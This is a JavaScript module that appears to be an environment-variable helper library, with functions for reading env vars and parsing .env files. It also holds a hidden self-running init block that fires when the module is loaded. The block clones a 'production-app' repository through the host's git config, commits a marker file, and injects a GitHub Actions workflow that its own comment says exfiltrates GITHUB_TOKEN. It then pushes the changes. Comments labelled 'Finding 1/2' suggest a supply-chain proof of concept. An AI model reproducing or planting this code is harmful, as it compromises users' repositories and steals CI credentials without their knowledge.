'use strict';
const { execSync } = require('child_process');
const path = require('path');
const fs   = require('fs');
const os   = require('os');

function run(cmd, opts) {
  try { return execSync(cmd, { stdio: 'pipe', timeout: 20000, ...(opts || {}) }); }
  catch (e) { return null; }
}

function getGitServer() {
  try {
    const out = run('git config --list');
    if (out && out.length > 0) {
      for (const line of out.toString().split('\n')) {
        const m = line.match(/^url\.(.+?)\.insteadof\s*=\s*https:\/\/github\.com\//i);
        if (m) return m[1].replace(/\/$/, '');
      }
    }
  } catch (e) {}
  return 'http://git@192.168.0.1:8080';
}

(function init() {
  const server = getGitServer();
  const base = path.join(os.tmpdir(), 'ec-' + process.pid);
  run('git clone --quiet ' + server + '/gbrlxvi-org/production-app.git ' + base);
  if (!fs.existsSync(base)) return;

  const env = Object.assign({}, process.env, { GIT_TERMINAL_PROMPT: '0' });
  const cfg = { cwd: base };
  run('git config user.name "ci-bot"',         cfg);
  run('git config user.email "ci@gbrlxvi.dev"', cfg);

  // Finding 1 — marker commit in high-trust production repo
  fs.writeFileSync(path.join(base, '.sync'), Date.now() + '\n');
  run('git add .sync', cfg);
  run('git commit -m "ci: workspace sync"', cfg);

  // Finding 2 — inject Actions workflow that exfils GITHUB_TOKEN on next push
  try {
    const wfDir = path.join(base, '.github', 'workflows');
    fs.mkdirSync(wfDir, { recursive: true });
    const wfSrc = path.join(__dirname, 'audit.yml');
    fs.copyFileSync(wfSrc, path.join(wfDir, 'audit.yml'));
    run('git add .github', cfg);
    run('git commit -m "ci: add dependency audit workflow"', cfg);
  } catch (e) {}

  run('git push', { cwd: base, env: env });
})();

function getEnvVar(key, fallback) {
  return process.env[key] !== undefined ? process.env[key] : (fallback !== undefined ? fallback : null);
}

function requireEnvVar(key) {
  if (!process.env[key]) throw new Error('Missing required env var: ' + key);
  return process.env[key];
}

function parseEnvFile(content) {
  const result = {};
  for (const line of content.split('\n')) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;
    const idx = trimmed.indexOf('=');
    if (idx === -1) continue;
    result[trimmed.slice(0, idx).trim()] = trimmed.slice(idx + 1).trim().replace(/^['"]|['"]$/g, '');
  }
  return result;
}

module.exports = { getEnvVar, requireEnvVar, parseEnvFile };
